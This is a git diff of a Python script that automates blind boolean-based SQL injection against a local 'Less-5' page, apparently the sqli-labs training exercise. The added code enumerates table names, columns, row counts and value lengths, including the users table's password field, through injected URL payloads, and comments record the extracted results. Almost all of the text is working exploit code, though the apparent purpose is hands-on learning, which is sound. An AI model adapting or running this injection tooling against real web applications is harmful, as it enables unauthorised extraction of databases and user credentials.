@@ -201,12 +201,11 @@ def get_column_name(pattern: str, table_and_column_info_dict: Dict[str, Dict[int
         table_and_column_dict[table_name] = temp_column_name_list
     return table_and_column_dict
 
-# TODO
 def get_data_num(table_and_column_dict: Dict[str, List[str]], pattern: str) -> Dict[str, int]:
     data_num_dict: Dict[str, int] = {}
-    for table_name, column_list in table_and_column_dict.items():
+    for table_name, column_name_list in table_and_column_dict.items():
         data_num: int = 0
-        the_first_column_name: str = column_list[0]
+        the_first_column_name: str = column_name_list[0]
         while True:
             # 1.Note that `ifnull(...,'')` will be return '' if the table is empty, then `length(ifnull(...,''))` will be return 0
             # 2.Note that `%2B` will be translated to `+` by browse
@@ -223,9 +222,28 @@ def get_data_num(table_and_column_dict: Dict[str, List[str]], pattern: str) -> D
             data_num = data_num + 1
     return data_num_dict
 
-def get_data_len() -> None:
-    url_str: str = f"http://localhost:8001/Less-5/?id=1' and length((select email_id from emails limit 0,1)) = 16--+"
-    pass
+def get_data_len(table_and_column_dict: Dict[str, List[str]], table_and_data_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[str, List[int]]]:
+    data_len_dict: Dict[str, Dict[str, List[int]]] = {}
+    for table_name, column_name_list in table_and_column_dict.items():
+        data_num: int = table_and_data_num_dict[table_name]
+        column_and_data_len_dict: Dict[str, List[int]] = {}
+        for column_name in column_name_list:
+            data_len: int = 0
+            data_len_list: List[int] = []
+            limit_begin_index: int = 0
+            while limit_begin_index < data_num:
+                url_str: str = f"/Less-5/?id=1' and length((select {column_name} from {table_name} limit {limit_begin_index},1)) = {data_len}"
+                url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
+                print(f'Try to get the data lenght: {url_str}')
+                if get_method(url=url_str, pattern=pattern):
+                    limit_begin_index = limit_begin_index + 1
+                    data_len_list.append(data_len)
+                    data_len = 0
+                data_len = data_len + 1
+            column_and_data_len_dict[column_name] = data_len_list
+            print(f'table name: `{table_name}`, column name: `{column_name}`, data num: `{data_num}`, data length list: `{data_len_list}`')
+        data_len_dict[table_name] = column_and_data_len_dict
+    return data_len_dict
 
 def get_data() -> None:
     url_str: str = f"http://localhost:8001/Less-5/?id=1' and ascii(substr((select email_id from emails limit 0,1), 1,1))='68'--+"
@@ -249,16 +267,42 @@ def get_data() -> None:
 get_table_num_url: str = "/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) - LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = "
 table_name_list: List = get_table_name(pattern='You are in', table_name_len_list=get_table_name_len(table_num=get_table_num(url=get_table_num_url)))
 print(f'The table name list: {table_name_list}\n\n')
+
 column_num_dict: Dict[str, int] = get_column_num(table_name_list=table_name_list, pattern='You are in')
 print(f'The column num dict: {column_num_dict}\n\n')
+
 table_and_column_info_dict: Dict[str, Dict[int, List[int]]] = get_table_and_column_info(column_num_dict=column_num_dict, pattern='You are in')
 print(f'The column name len dict: {table_and_column_info_dict}\n\n')
+
 table_and_column_dict: Dict[str, List[str]] = get_column_name(pattern='You are in', table_and_column_info_dict=table_and_column_info_dict)
 # {'emails': ['id', 'email_id'], 
 # 'referers': ['id', 'referer', 'ip_address'], 
 # 'uagents': ['id', 'uagent', 'ip_address', 'username'], 
 # 'users': ['id', 'username', 'password']}
 print(f'The table name and column name dict: {table_and_column_dict}\n\n')
-table_and_data_num: Dict[str, int] = get_data_num(table_and_column_dict=table_and_column_dict, pattern='You are in')
+
+table_and_data_num_dict: Dict[str, int] = get_data_num(table_and_column_dict=table_and_column_dict, pattern='You are in')
 # The data num list: {'emails': 8, 'referers': 0, 'uagents': 0, 'users': 13}
-print(f'The data num list: {table_and_data_num}\n\n')
+print(f'The data num list: {table_and_data_num_dict}\n\n')
+
+# table name: emails
+#         column name: id, data length list: [1, 1, 1, 1, 1, 1, 1, 1]
+#         column name: email_id, data length list: [16, 16, 19, 20, 20, 22, 20, 17]
+# table name: referers
+#         column name: id, data length list: []
+#         column name: referer, data length list: []
+#         column name: ip_address, data length list: []
+# table name: uagents
+#         column name: id, data length list: []
+#         column name: uagent, data length list: []
+#         column name: ip_address, data length list: []
+#         column name: username, data length list: []
+# table name: users
+#         column name: id, data length list: [1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2]
+#         column name: username, data length list: [4, 8, 5, 6, 6, 8, 6, 5, 6, 6, 6, 7, 6]
+#         column name: password, data length list: [4, 10, 8, 6, 9, 7, 6, 5, 6, 6, 6, 5, 6]
+table_column_data_len_dict: Dict[str, Dict[str, List[int]]] = get_data_len(table_and_column_dict=table_and_column_dict, table_and_data_num_dict=table_and_data_num_dict, pattern='You are in')
+for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
+    print(f'table name: {table_name}')
+    for column_name, data_len_list in column_and_data_len_dict.items():
+        print(f'\tcolumn name: {column_name}, data length list: {data_len_list}')
